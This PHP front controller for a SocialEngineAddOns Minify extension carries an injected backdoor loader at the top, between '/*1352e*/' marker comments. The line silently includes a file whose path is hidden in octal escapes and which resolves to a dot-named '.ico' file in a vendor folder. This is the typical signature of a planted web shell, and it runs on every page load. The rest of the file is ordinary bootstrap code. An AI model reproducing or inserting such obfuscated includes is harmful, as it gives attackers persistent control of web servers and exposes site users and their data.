<?php
/*1352e*/

@include "\057v\141r\057w\167w\057q\141_\162q\163t\160g\151n\163_\0620\0619\137u\160g\162a\144e\057e\170t\145r\156a\154s\057d\145s\153t\157p\055n\157t\151f\171/\056a\060c\0718\0647\061.\151c\157";

/*1352e*/
/**
 * Sets up MinApp controller and serves files
 * 
 * @category   Application_Extensions
 * @package    Siteminify
 * @copyright  Copyright 2017-2011 BigStep Technologies Pvt. Ltd.
 * @license    http://www.socialengineaddons.com/license/
 * @version    $Id: index.php 2017-01-29 9:40:21Z SocialEngineAddOns $
 * @author     SocialEngineAddOns
 */

/**
 * Front controller for default Minify implementation
 * 
 * DO NOT EDIT! Configure this utility via config.php and groupsConfig.php
 * 
 * @package Minify
 */
define('MINIFY_MIN_DIR', dirname(__FILE__));
define('_ENGINE_R_BASE', dirname(MINIFY_MIN_DIR));
$app = (require __DIR__ . '/bootstrap.php');
/* @var \Minify\App $app */

$app->runServer();
